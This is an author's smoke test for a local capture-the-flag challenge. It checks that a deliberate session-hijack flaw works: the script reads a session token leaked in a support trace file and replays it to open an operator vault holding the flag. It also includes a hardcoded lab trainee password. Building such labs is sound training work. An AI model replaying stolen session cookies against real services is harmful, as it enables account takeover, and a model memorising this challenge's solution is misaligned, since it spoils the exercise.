"""Author-only HTTP smoke test of the explicit local training target. Prints no flags/tokens."""
import http.cookiejar
import re
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8092"
PATH = "/session-hijack"
jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.ProxyHandler({}), urllib.request.HTTPCookieProcessor(jar))


def get(path, data=None):
    try:
        with opener.open(BASE + path, data=data, timeout=10) as response:
            return response.status, response.read().decode()
    except urllib.error.HTTPError as response:
        return response.code, response.read().decode()


def check(name, condition):
    if not condition:
        raise SystemExit("FAIL: " + name)
    print("PASS: " + name)


check("health endpoint", get("/healthz")[0] == 200)
check("anonymous vault denied", get(PATH + "/vault")[0] == 401)
check("wrong password denied", get(PATH + "/login", urllib.parse.urlencode({"username": "trainee", "password": "wrong"}).encode())[0] == 401)
check("trainee login", get(PATH + "/login", urllib.parse.urlencode({"username": "trainee", "password": "HorizonTrainee042!"}).encode())[0] == 200)
check("trainee vault denied", get(PATH + "/vault")[0] == 403)
status, trace = get(PATH + "/support/trace-042.txt")
match = re.search(r"nh_portal_session=([0-9a-f]{64})", trace)
check("intentional trace disclosure", status == 200 and match is not None)
for cookie in jar:
    if cookie.name == "nh_portal_session":
        cookie.value = match.group(1)
status, vault = get(PATH + "/vault")
check("replayed session opens operator vault", status == 200 and 'id="flag"' in vault)
expected = None
from pathlib import Path
flag_file = Path(__file__).parent / "private" / "ctfd-flag.txt"
if flag_file.exists():
    expected = flag_file.read_text().strip()
    check("vault flag matches CTFd handoff file", expected in vault)
check("private flag file not downloadable", get("/private/ctfd-flag.txt")[0] == 404)
print("Local HTTP checks passed. This does not test CTFd submission or Docker isolation.")
